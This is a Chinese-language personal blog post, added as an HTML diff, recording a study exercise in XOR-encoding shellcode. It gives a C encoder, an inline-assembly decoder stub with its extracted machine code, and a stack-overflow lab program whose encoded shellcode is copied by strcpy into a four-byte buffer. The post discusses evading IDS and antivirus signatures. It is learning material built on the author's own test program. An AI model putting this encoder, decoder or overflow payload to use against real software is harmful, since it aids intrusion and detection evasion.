@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="C语言,汇编语言,逆向,shellcode,免杀,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简单给shellcode加编码、解码过程。环境：VC++6.0 内嵌汇编">
+<meta name="keywords" content="C语言,汇编语言,逆向,shellcode,免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode编码解码">
+<meta property="og:url" content="http://yoursite.com/2020/02/18/shellcode编码解码/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="简单给shellcode加编码、解码过程。环境：VC++6.0 内嵌汇编">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/02/18/shellcode编码解码/编码原理.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/18/shellcode编码解码/解码原理.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/18/shellcode编码解码/提取解码器机器码.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/18/shellcode编码解码/跳转.png">
+<meta property="og:updated_time" content="2020-02-24T07:19:52.475Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="shellcode编码解码">
+<meta name="twitter:description" content="简单给shellcode加编码、解码过程。环境：VC++6.0 内嵌汇编">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/18/shellcode编码解码/编码原理.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/18/shellcode编码解码/">
+
+
+
+
+
+  <title>shellcode编码解码 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/18/shellcode编码解码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">shellcode编码解码</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-18T21:38:42+08:00">
+                2020-02-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/基础训练/" itemprop="url" rel="index">
+                    <span itemprop="name">基础训练</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简单给shellcode加编码、解码过程。<br>环境：VC++6.0 内嵌汇编<br><a id="more"></a></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote><p>在很多漏洞利用场景中，shellcode 的内容将会受到限制。<br>首先，所有的字符串函数都会对 NULL 字节进行限制。通常我们需要选择特殊的指令来避免在 shellcode 中直接出现 NULL 字节（byte，ASCII 函数）或字（word，Unicode 函数）。<br>其次，有些函数还会要求 shellcode 必须为可见字符的 ASCII 值或 Unicode 值。在这种限制较多的情况下，如果仍然通过挑选指令的办法控制 shellcode 的值的话，将会给开发带来很大困难。毕竟用汇编语言写程序就已经不那么容易了，如果在关心程序逻辑和流程的同时，还要分心去选择合适的指令将会让我这样不很聪明的程序员崩溃掉。<br>最后，除了以上提到的软件自身的限制之外，在进行网络攻击时，基于特征的 IDS 系统往往也会对常见的 shellcode 进行拦截。</p>
+</blockquote>
+<p><img src="/2020/02/18/shellcode编码解码/编码原理.png" alt><br><blockquote><p>当 exploit 成功时，shellcode 顶端的解码程序首先运行，它会在内存中将真正的 shellcode 还原成原来的样子，然后执行之。<br><strong>这种对 shellcode 编码的方法和软件加壳的原理非常类似。</strong></p>
+</blockquote><br><img src="/2020/02/18/shellcode编码解码/解码原理.png" alt><br><blockquote><p>很多病毒也会采取类似加壳的办法来躲避杀毒软件的查杀：首先对自身编码，若直接查看病毒文件的代码节会发现只有几条用于解码的指令，其余都是无效指令；当PE 装入开始运行时，解码器将真正的代码指令还原出来，并运行之、实施破坏活动；杀毒软件将一种特征记录之后，病毒开发者只需要使用新的编码算法（密钥）重新对PE 文件编码，即可躲过查杀。然而自古正邪不两立，近年来杀毒软件开始普遍采用内存杀毒的办法来增加查杀力度，就是等病毒装载完成并已还原出真面目的时候进行查杀。</p>
+</blockquote></p>
+<hr>
+<p><strong>主要过程：</strong><br><strong>1.编码阶段代码</strong><br><strong>2.解码阶段代码</strong><br><strong>3.对shellcode进行编码</strong><br><strong>4.提取解码器机器码与shellcode组合</strong></p>
+<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><p>来源于《0day安全：软件漏洞分析技术》<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">void encoder(char *input,unsigned char key,int display_flag)</span><br><span class="line">&#123;</span><br><span class="line">	int i=0,len=0;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	unsigned char *output;</span><br><span class="line">	len = strlen(input);</span><br><span class="line">	printf(&quot;%d\n&quot;,len);</span><br><span class="line">	output = (unsigned char *)malloc(len+1);</span><br><span class="line">	if(!output)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;memory error\n&quot;);</span><br><span class="line">		exit(0);	</span><br><span class="line">	&#125;</span><br><span class="line">	//encode the shellcode</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		output[i] = input[i]^key;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!(fp=fopen(&quot;encode.txt&quot;,&quot;w+&quot;)))</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;output file creat error\n&quot;);</span><br><span class="line">		exit(0);	</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;&quot;);</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fprintf(fp,&quot;\\x%0.2x&quot;,output[i]);</span><br><span class="line">		if((i+1)%16 == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			fprintf(fp,&quot;\&quot;\n\&quot;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;;&quot;);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;dump the encoded shellcode to encode.txt OK!\n&quot;);</span><br><span class="line">	if(display_flag)//print to screen</span><br><span class="line">	&#123;</span><br><span class="line">		for(i=0;i&lt;len;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;%0.2x &quot;,output[i]);</span><br><span class="line">			if((i+1)%16 == 0)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	free(output);</span><br><span class="line">&#125;</span><br><span class="line">void main()&#123;</span><br><span class="line">char *input=&quot;  &quot;;</span><br><span class="line">encoder(input,0x44,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是，若编码选择的key和shellcode中的一个字节一样，就会出现空字节。<br>另外由于有strlen函数，会对shellcode中的00进行截断，故我选择手动用key替换shellcode里的00…在shellcode没那那么长的时候可以，一旦长度很长了就….</p>
+<h1 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		add eax,0x14               //最开始是add eax,0x14，就是跳过解码部分的代码，寄存器指向编码后的shellcode。这样就定位了shellcode</span><br><span class="line">		xor ecx,ecx                //把ecx作为计数器</span><br><span class="line">decode:</span><br><span class="line">		mov bl,byte ptr [eax+ecx]  //byte ptr [eax+ecx]实现以字节计的每次移动一个字节解码</span><br><span class="line">		xor bl,0x44                //一个字节8位，每次解码一个，所以安排在了ebx低8位bl寄存器中</span><br><span class="line">		mov byte ptr [eax+ecx],bl</span><br><span class="line">		inc ecx</span><br><span class="line">		cmp bl,0x90                //最后设置一个0x90作为结束标志，要是bl的值和0x90解码后相同了就结束解码部分，开始执行后面已经解码的指令</span><br><span class="line">		jne decode</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意：<br>这段解码并不能单独运行，而是提取出机器码后和shellcode组合使用。<br>另外简单调用的时候，比如cmd、计算器等，需要配合下面代码使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">	lea eax, shellcode</span><br><span class="line">	push eax</span><br><span class="line">	ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提取出来的机器码：\x83\xc0\x14\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/18/shellcode编码解码/提取解码器机器码.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">跳转指令机器码：</span><br><span class="line"></span><br><span class="line">直接跳 JMP EB   八位</span><br><span class="line"></span><br><span class="line">直接跳 JMP E9   十六位</span><br><span class="line"></span><br><span class="line">直接标志转移（8位寻址）</span><br><span class="line"></span><br><span class="line">指令格式 机器码 测试条件 如…则转移 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JC 72 C=1 有进位 JNS 79 S=0 正号 </span><br><span class="line"></span><br><span class="line">JNC 73 C=0 无进位 JO 70 O=1 有溢出 </span><br><span class="line"></span><br><span class="line">JZ/JE 74 Z=1 零/等于 JNO 71 O=0 无溢出 </span><br><span class="line"></span><br><span class="line">JNZ/JNE 75 Z=0 不为零/不等于 JP/JPE 7A P=1 奇偶位为偶</span><br></pre></td></tr></table></figure></p>
+<p><strong>最后的跳转指令的机器码为：75 f1。很明显如果是地址的话不会这样短。</strong><br><strong>这是一个短跳转。这里的意思是往前跳13个字节。f1是相对偏移地址13。下图为kali工具nasm下的测试。</strong><br><img src="/2020/02/18/shellcode编码解码/跳转.png" alt></p>
+<h1 id="利用编码进行溢出实验"><a href="#利用编码进行溢出实验" class="headerlink" title="利用编码进行溢出实验"></a>利用编码进行溢出实验</h1><p>溢出实验的过程移步我前某篇文章=w=<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">char *shellcode=&quot;\x64\x65\x66\x67\x68\x69\x70\x71\xfb\xbf\xd7\x75\x90\x90\x90\x8b\xc4\x83\xc0\x19\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1\x2e\x41\x2e\x40\x2e\x47\x2c\x41\x54\x04\x44\xcf\x40\x60\xbb\x94\xc7\x80\x54\xd4&quot;;</span><br><span class="line"></span><br><span class="line">void fun1(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun1 run!para a=%d,b=%d\n&quot;,a,b);</span><br><span class="line">    char aa[4]=&#123;0&#125;;</span><br><span class="line">	strcpy(aa,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void fun3(int a,int b,int c)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;fun3 run! para a=%d,b=%d,c=%d\n&quot;,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*void fun2(int a)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;fun2 run! para a=%d\n&quot;,a);</span><br><span class="line">&#125;*/</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE libHandle;</span><br><span class="line">	char *dll=&quot;user32.dll&quot;;</span><br><span class="line">    libHandle=LoadLibrary(dll);</span><br><span class="line">    //LoadLibrary(dll);</span><br><span class="line">	printf(&quot;begin\n&quot;);</span><br><span class="line">	fun1(4198750,2);</span><br><span class="line">    </span><br><span class="line">	/*_asm&#123;</span><br><span class="line">	push 5</span><br><span class="line">	push 4</span><br><span class="line">	push 3</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push 0x2e401005</span><br><span class="line">	mov [esp+3],ebx</span><br><span class="line">	mov eax,dword ptr [esp]</span><br><span class="line">	call eax</span><br><span class="line">	add esp,16</span><br><span class="line">	&#125;*/</span><br><span class="line">	printf(&quot;end\n&quot;);</span><br><span class="line">	return	0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>注意，解码子在这里需要添加定位shellcode的代码：（上述shellcode已添加）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,esp</span><br></pre></td></tr></table></figure></p>
+<p>说一下我测试过程中遇到的问题。</p>
+<p>首先，是00的问题。在没编码之前，我通过先随便压栈一个参数代替00再用指令替换。编码后，可以选择00压栈，然后异或，则key被选为00，可以避免strcpy函数截断的问题。</p>
+<p>其次，是“花指令”问题。在最初的跟踪调试过程中，进行到解码子和我的shellcode时，总是没办法正常执行。后来查看内存发现我的机器码没有被正常翻译为汇编语言，组合错乱。所以选择了一些nop指令进行填充，并根据eax的值调整了跳过长度。</p>
+<p>遗留问题：返回地址-&gt;正常结束程序。有时间我会解决的，嗯，咕咕咕~</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/C语言/" rel="tag"># C语言</a>
+          
+            <a href="/tags/汇编语言/" rel="tag"># 汇编语言</a>
+          
+            <a href="/tags/逆向/" rel="tag"># 逆向</a>
+          
+            <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          
+            <a href="/tags/免杀/" rel="tag"># 免杀</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/15/栈溢出简单实验/" rel="next" title="栈溢出简单实验">
+                <i class="fa fa-chevron-left"></i> 栈溢出简单实验
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/18/花指令和内存蛙跳/" rel="prev" title="花指令和内存蛙跳">
+                花指令和内存蛙跳 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码"><span class="nav-number">2.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解码"><span class="nav-number">3.</span> <span class="nav-text">解码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用编码进行溢出实验"><span class="nav-number">4.</span> <span class="nav-text">利用编码进行溢出实验</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
